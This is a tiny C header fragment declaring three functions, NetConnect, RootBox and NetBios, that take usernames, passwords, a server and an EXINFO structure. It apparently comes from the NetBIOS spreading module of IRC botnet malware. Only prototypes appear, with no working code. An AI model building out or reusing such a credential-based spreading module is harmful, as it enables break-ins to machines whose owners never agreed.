

#ifndef NO_NETBIOS
int NetConnect(char *szUserName, char *szPassWord, char *szServer, EXINFO exinfo);
BOOL RootBox(char *szUserName, char *szServer, EXINFO exinfo);
BOOL NetBios(EXINFO exinfo);
#endif